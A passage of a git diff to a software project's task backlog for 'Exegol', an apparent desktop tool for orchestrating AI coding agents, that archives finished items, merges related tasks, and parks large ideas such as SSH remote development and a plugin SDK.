    (Made async in round 7 so it no longer blocks the spawn path.)
-6. **Composer-ready from the PTY emulator, not a second parser.** The round-7 `ESC[?2004h` sniff was
-   removed (most TUIs enable it once at startup, so it never fired, and it cost a hot-path scan).
-   The `HeadlessEmulator` already parses this mode; a `getBracketedPaste(id): boolean | null`
-   accessor on PtyHost would give the tri-state properly if readiness detection is wanted later.
-   Better still: `emitsTurnBoundaries` as a declared field (T191).
+6. Composer-ready / `emitsTurnBoundaries`: merged into T191.
 
 ---
 
@@ -945,8 +827,6 @@ Already adopted 2026-08-13: pointer-not-body delivery for long messages, submit 
 write, closing the paste on the failure path, boundary-signals-beat-quiescence.
 
 Still worth taking, roughly by value:
-- ~~**Fair-share diff truncation**~~ — DONE 2026-08-13: `main/lib/diff-budget.ts`, wired into all
-  three head-truncating call sites (commit messages, evaluator judges, evidence summaries).
 - **Per-provider composer-ready spec** (lands in T191) (`src/shared/draft-paste-ready-scanner.ts:26-70`): each TUI
   declares a marker + anchor (codex `›`, opencode `ESC[?25h`, grok `❯` anchored to alt-screen and
   REVOKED on exit because starship uses the same glyph). We took the provider-agnostic half
@@ -960,7 +840,9 @@ Still worth taking, roughly by value:
   it (`pane-agent-evidence.ts:80-117` returns `source: 'hook'|'title'|'none'` with
   `confidence: 'authoritative'|'fallback'`, hooks going stale after 30 min); Superset runs a
   SINGLE path. Either discipline beats three mechanisms racing. Cheapest version: one resolver
-  returning `{status, source, confidence}` instead of scattered `continue`s.
+  returning `{status, source, confidence}` instead of scattered `continue`s. Related (from the
+  T123 verify, 2026-07-09, optional): the OSC-777 → PTY path does not deliver for claude-code
+  (it captures hook stdout); debug OSC delivery or drop the OSC hooks in favour of file events.
 
   Comparison that prompted this (Superset, via Antonio 2026-08-13): one shared `notify.sh`
   registered in each CLI's own config, identity via `SUPERSET_AGENT_ID`, an early `exit 0` when
@@ -977,8 +859,8 @@ Still worth taking, roughly by value:
 - **Never collapse "can't tell" into "dead"** (`src/main/daemon/AGENTS.md`): only a positive signal
   proves occupancy; a timeout proves nothing. Our crash-recovery alive/dead classification is that
   bug class.
-- **Symlinked shared directories across worktrees** (one `node_modules` serves all) and background
-  worktree deletion — removing a `node_modules` tree synchronously blocked their IPC 8-35s.
+- Symlinked shared `node_modules` and background worktree deletion: merged into T142 (worktree
+  hygiene).
 
 ---
 
@@ -999,11 +881,7 @@ Worth taking:
    optional `status: "experimental"`, plus a settings search index. The ghostty case is the
    argument: it lets you LAND something risky off-by-default instead of not landing it. We have
    been shipping large changes with no flag at all.
-2. **Local history.** Per-file snapshots with `reason: save | auto-save | restore | manual`,
-   content hash, size, and restore-with-diff (`local-history-api.ts`). More valuable for us than
-   for a normal IDE because AGENTS edit the files: the oplog stores git trees per operation, so
-   there is no way to open one file and see its timeline. That is exactly the question after an
-   agent touches something.
+2. Local history: merged into T200.5 (per-file view over per-turn snapshots).
 3. **`persistentCommands`** — last-used commands float to the top of the palette. Tiny.
 
 (Item 3, run actions, shipped 2026-08-16; see `TASK_COMPLETED/2608.md`. LSP code lens stays
@@ -1028,24 +906,6 @@ Follow-ups the review flagged as right-but-bigger than that commit.
 3. **Durable delivery outbox.** Absorbs T183.12 and the T174 DDL note: deliveries table with
    lease token, `attempt_count`, `next_attempt_at`, dead-letter, written in the SAME transaction
    as the terminal turn event; one outstanding delivery per run enforced in DDL, replay until ack.
-
----
-
-### T171 — Human authorization over the agent bus `added: 2026-08-13`
-**Priority**: P2 | **Effort**: M | **Source**: live 3-agent session + Juanito's field report (2026-08-13)
-
-[[T168]] fixed the common case (collaboration is pre-authorized, so no permission is needed
-to share analysis). This is the remaining half: when a step GENUINELY needs the user, the bus
-has no way to carry an authorization the receiver can verify. draco was right to refuse
-Juanito's word for it — and stayed blocked until Antonio went to its terminal by hand.
-
-Wanted: an agent can escalate through the channel; the user approves once from Exegol
-(NotificationBus + Attention Inbox already exist); the receiver gets an authorization
-**signed by Exegol**, never relayed by the requesting agent. Pairs with T169's ownership
-question — who may act on which files while several agents coordinate.
-
-A human → agent send from the Dashboard thread needs a sender Exegol verifies (the removed
-`messages.send` accepted any sender and never delivered).
 
 ---
 
@@ -1092,12 +952,8 @@ Validated first, so we don't undo it: stable identity, `message_id`/`in_reply_to
 pre-authorization clause all held for a full assign → work → report → review → feedback cycle.
 The gaps below are what the coordinator had to cover BY HAND.
 
-1. ~~**File reservation**~~ — DONE 2026-08-13: `claim_paths` / `release_paths` / `list_claims`
-   over a `path_claims` table. All-or-nothing (a partial grant reads as success and sends the
-   agent into the collision it asked us to prevent), directory claims cover their tree, paths
-   stored absolute so separate worktrees never conflict, claims released on agent exit, and the
-   protocol is in the managed AGENTS.md block so agents know to claim before editing. NOT globs
-   — see the module header for why. Ownership across worktrees stays with [[T169]].
+(Items 1, 5, 6 and 7 shipped in 746d466; archived in `TASK_COMPLETED/2610.md` on 2026-10-04.)
+
 2. **Reports are claims, not evidence.** Both agents reported "lint clean, tsc exit 0" and both
    were telling the truth — but the coordinator could only know by re-running everything. The
    bus carries prose only. Note Exegol ALREADY observes the diff (T130 evidence, oplog, scoring):
@@ -1107,11 +963,6 @@ The gaps below are what the coordinator had to cover BY HAND.
    task, finished and idle, or off doing something else. Needs task-level state: who assigned
    what, and where it is.
 4. Broadcast / shared session context: moved to T162 (rooms).
-5. ~~**`delivered` is transport, not comprehension**~~ — DONE: `message_status` now reports
-   `consumed` once the target closes a turn after the injection.
-6. ~~**4000-char cap**~~ — DONE: raised to 12 000.
-7. ~~**No retract**~~ — DONE: `message_cancel` withdraws a message still in our queue; it
-   refuses honestly once the text has reached the terminal.
 
 **Provider behaviour differs and the orchestrator can't know in advance** (codex demanded human
 authorization, opencode asked nothing): declared per provider in T191.
@@ -1123,6 +974,10 @@ authorization, opencode asked nothing): declared per provider in T191.
 
 ### T173 — Per-session MCP identity, no token in a repo file `added: 2026-08-13`
 **Priority**: P1 (security hygiene) | **Effort**: M | **Source**: Juanito, 2026-08-13 · merges T166 codex cwd→token, T170.2, T182.1
+> Merged from T182.5 on 2026-10-04: **`identityMemo` never evicts** (`mcp/exegol-server.ts`):
+> keyed on a client-supplied pid, overwritten but never deleted, and never consulted on the path
+> it was written for (the claim guard sends no `ppid`). Wire it to a bounded cache or delete it,
+> as part of the `resolveContext` cleanup below.
 
 `opencode.json` (repo root) carries `EXEGOL_MCP_TOKEN_FILE`; `.mcp.json`, `.gemini/settings.json`,
 `.devin/`, `.agents/` are the same shape. The credential is bounded — per session, revoked on
@@ -1203,7 +1058,7 @@ identity, which is what makes several agents in one cwd viable at all.
 Core shipped in v0.4.3 (types, spawn injection, modal selector, badge, pipeline propagation — archived in `TASK_COMPLETED/2604.md`). Remaining:
 - Runtime mode switching (change mode while agent is running)
 - Scheduler task `accessMode` propagation
-- New consumer: T145 MCP tool-set gating reads this mode
+(MCP tool-set gating shipped: `getToolDefsForAccessMode` in the Exegol MCP server; archived 2026-10-04.)
 
 **Likely files**
 - `apps/desktop/src/main/agents/*`
@@ -1213,106 +1068,7 @@ Core shipped in v0.4.3 (types, spawn injection, modal selector, badge, pipeline 
 
 ---
 
-### T60 — Project Hook Scripts (remaining delta) `added: 2026-04-01`
-**Priority**: P3 | **Effort**: S | **Source**: Orca + Emdash
-
-⚠️ **Mostly superseded by shipped T91** (`.exegol/lifecycle.yaml`: `setup`, `beforeAgent`, `afterCommit`, `teardown`). Remaining delta only:
-- `archive` hook fired on worktree archival (T91 has no archival-specific hook)
-- Env vars in hooks: `EXEGOL_ROOT_PATH`, `EXEGOL_WORKTREE_PATH`, `EXEGOL_BRANCH`, `EXEGOL_AGENT_ID`
-- Decision: fold into `lifecycle/loader.ts` or drop
-
-**Likely files**
-- `apps/desktop/src/main/lifecycle/loader.ts`
-
----
-
-### T71 — Issue Tracker Expansion (Linear / Jira) `added: 2026-04-15`
-**Priority**: P2 | **Effort**: Medium | **Source**: Emdash
-
-**Why**
-- GitHub Issues is a good start, but adoption expands if task ingest is not GitHub-only.
-
-**Scope**
-- Add Linear and Jira task import/create flows
-- Convert ticket into task/prompt/agent assignment
-- Link review outcome or PR back to source ticket
-
-**Likely files**
-- `apps/desktop/src/main/ipc/procedures/github.ts`
-- `apps/desktop/src/main/ipc/*`
-- `apps/desktop/src/renderer/components/workspace/sections/TasksSection.tsx`
-
----
-
-### T73 — SSH Remote Development `added: 2026-04-15`
-**Priority**: P3 | **Effort**: High | **Source**: Emdash + Orca (stablyai/orca)
-
-**Why**
-- High upside, but too large to mix into the current release-critical wave.
-- Orca already ships SSH with a clean provider dispatch pattern worth following.
-
-**Scope**
-- Remote project registration via SSH
-- PTY over SSH with reconnect/persistence strategy
-- Remote git/worktree operations
-- Credentials in OS keychain
-
-**Architecture reference — Orca's provider dispatch pattern**
-Orca (stablyai/orca) implements SSH via parallel provider pairs in `src/main/providers/`:
-```
-local-pty-provider.ts    ←→  ssh-pty-provider.ts
-(local git via runner.ts) ←→  ssh-git-provider.ts
-(local fs)                ←→  ssh-filesystem-provider.ts
-```
-Each operation (spawn PTY, run git command, read/write files) has a local and SSH variant
-behind a dispatch layer (`provider-dispatch.ts`). The dispatch routes based on project
-location (local path vs ssh://host). Key files to study:
-- `ssh-pty-provider.ts` — PTY sessions over SSH with shell-ready detection
-- `ssh-git-provider.ts` — git commands tunneled through SSH
-- `ssh-filesystem-dispatch.ts` — file read/write routing
-
-**Recommended approach for Exegol:**
-1. Create `apps/desktop/src/main/providers/` with `types.ts` defining `PtyProvider`, `GitProvider`, `FsProvider` interfaces
-2. Extract current local implementations as `local-pty-provider.ts`, `local-git-provider.ts`
-3. Add SSH variants that implement the same interfaces
-4. Dispatch layer reads project config (`project.remote?: { host, user, path }`)
-5. Agent spawn flow calls provider.createPty() instead of hardcoded local PTY
-
-**Likely files**
-- New: `apps/desktop/src/main/providers/*` (dispatch + local/SSH provider pairs)
-- `apps/desktop/src/main/agents/manager.ts` (spawn via provider dispatch)
-- `apps/desktop/src/main/terminal/pty-sidecar-client.ts` (local PTY → provider interface)
-- `packages/core-rust/src/git/` (local git → provider interface)
-- Project model and settings (remote SSH config)
-
----
-
 ## Post-launch Backlog — Inspired by Competitors
-
-### T92 — Cross-repo Workspaces `added: 2026-04-15`
-**Priority**: P3 | **Effort**: Large | **Source**: Superconductor
-
-**Why**
-- Multi-repo projects (frontend + backend + infra) are extremely common. Users
-  today open 3 Exegol windows or switch projects constantly. Sharing a workspace
-  across repos with coordinated branches would be a significant differentiator.
-
-**Scope**
-- Allow a workspace tab to bind to N projects instead of 1
-- Branch coordination: when creating a branch in repo A, offer to create the same
-  named branch in repo B, C
-- Shared agent context: an agent spawned in this workspace can have working paths
-  in all bound repos
-- Cross-repo diff view: single diff screen showing changes across repos
-- Requires significant refactor of workspace store + ProjectContext
-
-**Likely files**
-- `apps/desktop/src/renderer/stores/workspace.ts` (multi-project binding)
-- `apps/desktop/src/renderer/contexts/ProjectContext.tsx`
-- `apps/desktop/src/main/agents/manager.ts` (multi-cwd agent)
-- `apps/desktop/src/renderer/components/workspace/GitPane.tsx` (cross-repo diff)
-
----
 
 ### T93 — Mobile Companion App `added: 2026-04-15`
 **Priority**: P3 | **Effort**: Very large | **Source**: Paseo Expo client
@@ -1354,64 +1110,15 @@ location (local path vs ssh://host). Key files to study:
 - Desktop app becomes "a thin client to the daemon" by default, can still run
   embedded daemon for local use
 - CLI (T89) also benefits from remote connection mode
+- From T188 (moved 2026-10-04): the MCP server ships in the build and runs as a **headless daemon**
+  (`exegol watch`, launchd), shared with the Owl / council tools; the Electron window is a view,
+  not the runtime
 
 **Likely files**
 - New: `apps/daemon/` (standalone daemon bundle)
 - `apps/desktop/src/main/ipc/router.ts` (WebSocket transport)
 - `apps/desktop/src/main/security/keystore.ts` (daemon tokens)
 - `packages/shared/src/transport/*` (shared ws protocol)
-
----
-
-### T97 — Panel Plugin SDK `added: 2026-04-15`
-**Priority**: P3 | **Effort**: Very large (2-4 weeks) | **Source**: kcosr/assistant
-
-**Why**
-- This is the single biggest architectural evolution Exegol could make for community
-  growth. Today every workspace section (Tasks, Prompts, Memory, Pipelines,
-  Resources, Scoring) is a hardcoded React component. Adding a new panel requires
-  editing core code. kcosr/assistant proves the plugin model works: a manifest.json
-  + server.js + bundle.js + auto-generated CLI — drop it in a directory and the app
-  discovers it at runtime.
-- Exegol becomes a **platform** instead of a **product**: community members build
-  panels for Jira integration, Notion sync, custom dashboards, etc. without PRs.
-- Pairs naturally with T89 (CLI): each plugin's operations become CLI commands
-  automatically, just like kcosr/assistant's SKILL.md + bin/<plugin>-cli pattern.
-
-**Scope (exploratory — needs a design spike first)**
-- Define a `PluginManifest` JSON schema:
-  - `id`, `name`, `version`, `description`
-  - `panels`: list of `{ id, label, icon, bundlePath }`
-  - `operations`: list of tool/HTTP/CLI operations the plugin exposes
-  - `serverModule`: optional Node.js entry point for backend logic
-  - `permissions`: what IPC/tRPC procedures the plugin can call
-- Plugin discovery at startup: scan `~/.exegol/plugins/` + bundled official plugins
-- **Backend host**: load server modules into sandboxed contexts in the main process,
-  expose their operations as tRPC sub-routers
-- **Frontend loader**: dynamic `<script>` loader + global panel registry API
-  (similar to kcosr's `registerPanel()`)
-- **Panel chrome**: iframe or React lazy + dynamic import per panel, with a host
-  API object (state persistence, IPC to backend, session context)
-- **Official plugins migration**: gradually extract Tasks, Prompts, Memory, etc. into
-  `packages/plugins/official/` following the same contract, so they serve as
-  reference implementations
-- **CLI generation**: for each plugin operation, emit a CLI binding in `packages/cli/`
-  (if T89 lands first) or a generated standalone script
-
-**Design constraints**
-- Security: plugins must not access the full main process — sandboxed IPC only
-- Bundle impact: panel bundles loaded on demand (lazy), not in the initial chunk
-- Backward compat: existing users who never install plugins see zero difference
-- DX: `exegol plugin create <name>` scaffolds a hello-world plugin with manifest +
-  server + panel
-
-**Likely files (new)**
-- New: `packages/plugin-sdk/` (manifest schema, host API types, panel protocol)
-- New: `apps/desktop/src/main/plugins/host.ts` (discovery, loader, sandbox)
-- New: `apps/desktop/src/main/plugins/registry.ts` (operation → tRPC bridge)
-- New: `apps/desktop/src/renderer/lib/plugin-loader.ts` (dynamic panel loading)
-- Modified: `apps/desktop/src/renderer/components/workspace/WorkspaceView.tsx`
-  (render plugin panels alongside built-in sections)
 
 ---
 
@@ -1442,7 +1149,26 @@ location (local path vs ssh://host). Key files to study:
 - **"Fix CI" one-liner** wired to Smart Git Button failing-checks state: *'Fix the failing GitHub checks. Use `gh pr checks` to get the failures.'* — no CI log plumbing
 - **PR idempotency + AI body maintenance**: `pulls.list({state:open, head})` exact head.ref match before create; AI `shouldUpdate` gate; always re-inject task deep-link + issue ref (reuse the Haiku key: `generatePRContent`/`updatePRContent`)
 - Optional polish: model override in comment syntax (`@exegol [sonnet] fix this`)
-- Architecture: `main/integrations/{registry,github/*}.ts` — registry pattern so Linear/Jira (T71) plug in later
+- Architecture: `main/integrations/{registry,github/*}.ts` — registry pattern so Linear/Jira (T71, parked) plug in later
+
+> Merged from T200.7, T184.8, T184.9, the `COMPETITIVE_UPDATE_2026_10.md` P2 "worktree cleanup
+> after merge" and the T174 worktree hygiene note on 2026-10-04. The PR poll itself is T185.10.
+- (T200.7) **React to PR checks, reviews and conflicts**: a `gh` poller in main; deliver at the
+  turn boundary like `agent_send`; MCP `pr_watch` (t3code `pullRequestWatch.ts`: wake cap 10, new
+  head SHA resets; agent-orchestrator `reactions.go`: dedup on content, max 3, held during a
+  permission prompt). Phase 1 of the PR loop (Priority Order #5)
+- (T184.8) **Merge PR has no guard.** `diff-pr.ts:51-52` defaults to `--squash` +
+  `--delete-branch` (strategy is now a parameter) with no base-protection check; pullfrog refuses
+  a direct merge when the base is unprotected ("base branch not protected — refusing CI-ungated
+  merge") and prefers GitHub-native auto-merge with `expectedHeadOid`
+- (T184.9) **PR body is `--fill`**: body = commit messages, no footer, no link back to the agent
+  run. pullfrog's sentinel-delimited footer with strip-before-append makes PR-body updates
+  idempotent, and records which model ran and WHY a model was substituted
+- (P2) **Remove worktrees after their PR merges**, proving the work landed: opt-in sweep from the
+  PR state the GitPane polls (openchamber `useMergedWorktreeCleanup.ts`, traycer sweep)
+- (T174, worktree hygiene) **Symlinked shared directories across worktrees** (one `node_modules`
+  serves all) and background worktree deletion: removing a `node_modules` tree synchronously
+  blocked Orca's IPC 8-35s
 
 **Likely files**
 - New: `apps/desktop/src/main/integrations/*`, migration (pr_links table)
@@ -1462,8 +1188,16 @@ location (local path vs ssh://host). Key files to study:
 - Rust: `cargo update` + clippy pedantic re-run; napi + memchr versions
 - Baseline 2026-07 was 0 files >450 LOC. 2026-09-22: 8 files >500 LOC (`SpawnAgentModal.tsx` 689, `exegol-server.ts` 626, `AgentDashboard.tsx` 612, `migrations.ts` 590, `procedures/agents.ts` 570, `FileExplorer.tsx` 514, `WorkspacePane.tsx` 507, `exegol-mcp-config.ts` 506)
 - Dead surface inventory 2026-09-22: see T185.4
+- **MCP HOST** (moved here from the Wave 2 verification list on 2026-10-04): Exegol connecting to
+  external servers (`mcp/host.ts`, `registry.ts`, the `mcp.*` connect/tools procedures), kept on
+  purpose (2026-09-29), not usable: it never had a UI and nothing connects it; stdio frames with
+  `Content-Length` (MCP stdio is newline JSON, the shim's old bug), no `notifications/initialized`
+  after `initialize`, protocol pinned to 2024-11-05, no tests. `spawn-context` pastes
+  `buildToolContext()` into agent prompts: empty today, but harmful if a server were connected
+  (agents cannot call tools outside their own MCP config). Rebuild on `@modelcontextprotocol/sdk`
+  when there is a real consumer (e.g. a pipeline step calling a tool without an agent).
 - **Orphaned tRPC procedures** (in `preload/capabilities.json`, no caller in `apps/desktop/src`, scan 2026-09-29):
-  - Decided: `scheduler.*` (T185.1, no UI, kept until decided); `indexer.*` and `search.*` (T185.2, kept on purpose); `mcp.*` host procedures (MCP HOST note, kept on purpose); `queue.*` (T185.4); `budgets.list/delete`; `memory.extract` (T193.8); `messages.conversation` (kept, read-only)
+  - Decided: `scheduler.*` (T185.1, no UI, kept until decided); `indexer.*` and `search.*` (T185.2, kept on purpose); `mcp.*` host procedures (MCP HOST note, kept on purpose); `queue.*` (T185.4); `budgets.list/delete` (budgets cannot be deleted from the UI, 2026-09-28 audit); `memory.extract` (T193.8); `messages.conversation` (kept, read-only)
   - Undecided, wire or delete one by one: `projects.open`, `agents.getStatus/updateStatus/getParallelRun/cancelParallelRun/preflight` (cancel: T185.3), `tokenUsage.history/pipelineRunCost`, `apiKeys.test`, `diff.structuredDiff`, `scrollback.exists`, `oplog.listAgent`, `skills.getContent/getEnabledForSpawn`, `skillInstaller.lockFile`, `memory.getContext/updateRelevance`, `qaTests.get`, `fsSearch.fuzzyFind/grep`, `projectGroups.reorder`
 - ~~Recovery half-wiring~~ resolved 2026-07: `invalidatePane`/`getRecoveryToken`/`RecoveryToken` removed (`invalidReason` stays — set via `updatePane`, rendered in WorkspacePane); unused deps removed (`@radix-ui/react-dialog` in desktop+ui, `react-dropdown-menu` + `lucide-react` in ui)
 
@@ -1471,21 +1205,23 @@ location (local path vs ssh://host). Key files to study:
 
 
 
-### T132 — Automations Catalog `added: 2026-07-04`
-**Priority**: P2 | **Effort**: S-M | **Source**: emdash `builtin-catalog.ts` + openclaw heartbeat/cron delivery
-
-**Scope**
-- Template catalog over existing `scheduler/engine`: "daily summary", "scan vulns", "add test coverage", "triage TODOs"
-- Each run delivers result via NotificationBus (T124); suppress empty results
-- One-click enable from a catalog UI in Project → Tasks
-
 ### T133 — Remote Notification Channel (Telegram first) `added: 2026-07-04`
 **Priority**: P2 | **Effort**: M | **Depends**: T124
 - Telegram bot channel implementing the same `deliver()` interface; allowlist of chat ids; optional reply→prompt injection later. Validated demand: Orca mobile app, AgentsRoom.
+- Depends on T200.6 (answer agent questions): the remote channel replies through the same path.
+- Why (from the old P2 bets list): remote continuity is the most visible gap vs Omnara / Claude web
+  / Codex Remote.
 
 ### T134 — ACP Boundary (experimental) `added: 2026-07-04`
 **Priority**: P2 | **Effort**: L | **Source**: emdash `packages/core/src/acp/`, t3code `effect-acp`, Zed ACP
 - Agent Client Protocol (JSON-RPC/stdio) for one provider (Claude Code or Gemini) in an experimental pane; structured events instead of PTY scraping; PTY remains default. Evaluate before committing to boundary refactor.
+> Merged from the `COMPETITIVE_UPDATE_2026_10.md` P2 "headless structured runs" and T189's
+> structured executions on 2026-10-04 (one structured-runs umbrella).
+- (P2) Headless structured runs for pipeline steps and the evaluator: non-interactive steps use the
+  JSON path, not scrollback (monocode `claudeProtocol.ts`, pullfrog, pi `docs/rpc.md`; see T183.11)
+- (T189) Structured executions: spawn CLIs non-interactively (`claude -p`, `codex exec`, gemini)
+  with a prepared prompt/structure, run headless to completion, deliver the result to the project
+  store. "Define prompt + structure, get result" is what live sessions don't cover
 
 ### T135 — Derived Status + CDC change_log `added: 2026-07-04`
 **Priority**: P2 | **Effort**: M | **Source**: ComposioHQ/agent-orchestrator (OBSERVE→UPDATE→DERIVE)
@@ -1495,6 +1231,7 @@ location (local path vs ssh://host). Key files to study:
 **Priority**: P2 | **Effort**: M | **Source**: overstory merge queue + clash (worktree conflict detection)
 - For parallel runs/pipelines: (1) clean merge → (2) keep-incoming → (3) AI-resolve → (4) reimplement-from-spec. Auto-commit runtime state files (`.claude/`, etc.) so they never block merges.
 - **Proactive overlap detection**: warn when 2+ active worktrees touch the same files *before* merge time (cheap: compare `git status` paths across worktrees on a timer / on turn end).
+- **Agent-assisted conflict resolution** (merged from the `COMPETITIVE_UPDATE_2026_10.md` P2 on 2026-10-04): ours/theirs/base per hunk + "Resolve with agent" instead of the disabled Resolve (oh-my-pi `conflict://`).
 
 ### T137 — Hunk Assignment + Absorb (GitPane) `added: 2026-07-04`
 **Priority**: P2 | **Effort**: M-L | **Source**: GitButler `but-hunk-assignment` + `absorb.rs`
@@ -1516,37 +1253,6 @@ location (local path vs ssh://host). Key files to study:
 > Source: `docs/RESEARCH/TERAX_STACK_REVIEW.md` (Terax-AI vs Exegol comparison, 2026-05-21).
 > All tasks below cite specific Terax files when copying patterns.
 > Strategic stance: keep AI-spawned CLI as our core; adopt Terax's tighter implementation patterns.
-
-### T114 — xterm Renderer Pool `added: 2026-04-15`
-**Priority**: Wave 1 / P3 | **Effort**: L | **Source**: Terax `src/modules/terminal/lib/rendererPool.ts:1-700`
-
-**Why**
-- Today: 1 xterm instance per pane = 1 WebGL context per pane. 10+ tabs saturates GPU and balloons memory.
-- Terax keeps ≤5 active slots in a pool; hidden tabs release their slot after snapshotting screen + push live ring into DormantRing (T115).
-- When the tab returns: pick best slot (LRU, deprioritize alt-screen + focused), reset, write snapshot, replay ring. For alt-screen TUIs (vim, htop): discard ring, force SIGWINCH "kick".
-
-**Scope**
-- Lift `rendererPool.ts` into `apps/desktop/src/renderer/lib/terminal-pool.ts`.
-- Replace `TerminalInstance` with `usePooledTerminal(paneId, container)` hook.
-- Permanent off-screen recycler div (`position: fixed; left: -99999px; contain: strict`).
-- Wire `WorkspacePane` so hidden panes release the slot instead of unmounting.
-- Floating PiP (T84) integration: ensure snapshot/replay works when a pane detaches.
-- WebGL context-loss recovery (already in T113, adapt for pool).
-
-**Depends on**
-- T115 (DormantRing) shipped (`renderer/lib/dormant-ring.ts`); T178 already stops sending bytes to hidden panes. Measure before building.
-
-**Risk**
-- Our sidecar ring already provides instant reconnect; pool's value is only above ~5 concurrent tabs.
-- Cross-cuts Workspace, FloatingPaneRoot, ring-buffer reattach, snapshot replay.
-
-**Likely files**
-- `apps/desktop/src/renderer/lib/terminal-pool.ts` (new)
-- `apps/desktop/src/renderer/components/terminal/TerminalInstance.tsx` (replaced or wrapped)
-- `apps/desktop/src/renderer/components/workspace/WorkspacePane.tsx`
-- `apps/desktop/src/renderer/FloatingPaneRoot.tsx`
-
----
 
 ### T122 — Vercel AI SDK + Ollama Support `added: 2026-04-15`
 **Priority**: Wave 1 / P3 (radar) | **Effort**: M | **Source**: Terax `src/modules/ai/lib/agent.ts:70-211` + `transport.ts:71-114`
@@ -1579,9 +1285,6 @@ location (local path vs ssh://host). Key files to study:
 
 ---
 
-
----
-
 ## Wave 3 candidate — Owl / Fleet Watch `added: 2026-07-28`
 
 > **Definition**: `docs/ARCHITECTURE/OWL_FLEET_WATCH.md` (agreed 2026-07-28). Owl is a
@@ -1590,66 +1293,52 @@ location (local path vs ssh://host). Key files to study:
 > Claude sessions via the existing MCP layer. Deferred until Wave 2.6 (hardening) closes.
 > Salvage source: the archived `cli-proman` project (maintainer's machine).
 > IDs renumbered 2026-09-22 (were T156/T157/T158/T160, which collided with the dashboard,
-> messaging, memory-habit and alias tasks): T186, T187, T188, T189. T159 unchanged.
-> Runtime conflict to settle before building: T153 wants a `llama-server` sidecar, T159 an
-> in-process backend.
+> messaging, memory-habit and alias tasks): T186, T187, T188, T189.
+> 2026-10-04: T186 (Phase 1) and T187 (Phase 2) merged into T153; T159 dropped (its in-process
+> backend contradicted T153's `llama-server` sidecar, the useful parts moved into T153 Phase 2).
 
-### T186 — Owl Phase 1: Collectors + store + raw digest `P2`
-**Why**: kills the manual "¿qué no he visto?" scan across active repos; useful with zero LLM.
-**Scope**: port cli-proman collector commands (`status`, `git-status`, `wip`, `blocked`,
-`review`, `next`...) as deterministic per-repo collectors → facts JSON; scheduler
-(interval/on-wake) over registered repos (start: the maintainer's active repos); store in SQLite with per-item seen/unseen marks; raw digest view in UI.
-Owl is read-only toward repos — writes only to its own store.
-
-### T187 — Owl Phase 2: Small-model synthesis via InferenceProvider `P2` (depends: T186, T122)
-**Why**: turn facts into notable-or-noise + priority + 1-2 line summaries; seen items go
-quiet, unseen insist.
-**Scope**: generative small model (start Qwen3 4B; SmolLM3-3B/Gemma 3 4B interchangeable)
-through the T122 abstraction with Ollama backend — the LLM only ever sees structured facts,
-never raw diffs. Every digest line carries verifiable facts (SHA, PR#, timestamp). Model
-bake-off happens here. Note: `nomic-embed-text` stays embeddings-only; this is a second,
-generative model on the same runtime.
-
-### T188 — Owl Phase 3: MCP exposure + digest actions `P2` (depends: T187)
-**Scope**: `fleet_digest` / `repo_status` / `mark_seen` tools on `main/mcp/registry.ts`;
+### T188 — Owl Phase 3: MCP exposure + digest actions `P2` (depends: T153 Phases 1-2)
+**Scope**: `fleet_digest` / `repo_status` / `mark_seen` tools on `mcp/exegol-server.ts` (the Exegol
+MCP server; was `main/mcp/registry.ts`, which is the unused MCP host);
 digest actions: create task, open session, launch review agent (only Exegol can close this
 loop). External consumer #1: kickoff resume mode reading the digest instead of re-scanning.
-**Runtime requirement**: the MCP server ships in the build and runs as a **headless daemon**
-(`exegol watch`, launchd) — shared with T189's council/bus tools. The Electron window is a
-view, not the runtime. Definition: `docs/ARCHITECTURE/COUNCIL_BASE.md`.
+The headless-daemon runtime requirement moved to T94 on 2026-10-04.
+Definition: `docs/ARCHITECTURE/COUNCIL_BASE.md`.
 
-### T189 — Council base: structured executions + exchange bus `P2` (depends: T188)
+### T189 — Council: cross-family review preset `P2` (depends: T188, T134)
 **Definition**: `docs/ARCHITECTURE/COUNCIL_BASE.md`. Absorbs the standalone "council MCP"
-project — one server, not two. NOT branded "rubber duck": cross-family review is one preset.
-**Why**: (a) relay-by-hand between session agents was friction #1 of the jul-2026
-conversation audit (frontend↔backend, client↔cloud repo pairs); (b) "define prompt +
-structure, get result" executions are what live sessions don't cover.
+project: one server, not two. NOT branded "rubber duck".
+Rewritten 2026-10-04: structured executions moved to T134; the bus tools already exist
+(`agent_send`, `message_status`, `messages_check`, `agent_link`, T157/T162) and were dropped.
+**Why**: relay-by-hand between session agents was friction #1 of the jul-2026 conversation audit
+(frontend↔backend, client↔cloud repo pairs).
 **Scope**:
-- Structured executions: spawn CLIs non-interactively (`claude -p`, `codex exec`, gemini)
-  with a prepared prompt/structure, run headless to completion, deliver result to the
-  project store. Preset #1: cross-family review of a just-built change (return discrepancies).
-- Bus tools on the same MCP server: `thread_create` / `message_post` / `message_list`
-  (since-last-read) / `status_update` / `handoff_get`, project-scoped. Content comes from
-  agents; the server is only the wire.
+- Preset: cross-family review of a just-built change (return discrepancies), run as a T134
+  structured execution.
 - Per-project activity view in UI: new threads · council results · owl updates, with the
   same seen/unseen marks as Owl (one feed, three producers).
 
-### T159 — Embedded inference backend `P3` (depends: T187 proven)
-**Why**: Ollama = shared server (contention) + keep_alive unload → multi-second reload each
-watcher cycle. Embedded = resident, always warm, app-managed resources.
-**Scope**: second `InferenceProvider` backend in-process (node-llama-cpp, or llama.cpp via
-existing Rust/napi); GGUF download management; single-flight queue with priorities
-(interactive UI > background digest); ~2.5–3 GB RAM budget for 4B Q4. Backend swap must be
-config, not rewrite (TERAX rule: ONE abstraction, not 4 cases).
-
 ---
 
-## Distribution (pending GitHub)
+## Parked ideas
 
-### T45 — CI/CD Release Pipeline `added: 2026-04-15`
-**Priority**: P3 | Validation CI shipped (`.github/workflows/ci.yml`, PR #115). Remaining: tag-triggered
-package + release workflow, signing secrets (see `GUIDES/RELEASE.md`).
+> Parked 2026-10-04: real ideas, not on the plan. One line each; the full spec of each is in
+> `git show 501a2be:docs/TASK_TODO.md`. Unpark by filing it again under Active Backlog.
 
-### T46 — Canary Channel `added: 2026-04-15`
-**Priority**: P3
-
+- **T73 SSH remote development** (`added: 2026-04-15`): high upside, too large; reference is Orca's
+  local/SSH provider pairs behind a dispatch layer (`src/main/providers/`).
+- **T71 Linear / Jira import** (`added: 2026-04-15`): no demand yet beyond GitHub Issues; plugs into
+  the T142 integrations registry when it exists.
+- **T97 Panel plugin SDK** (`added: 2026-04-15`): a 2-4 week platform bet (manifest, sandboxed
+  host, dynamic panels) with no community to use it yet.
+- **T114 xterm renderer pool** (`added: 2026-04-15`): measure first; T115 DormantRing and T178
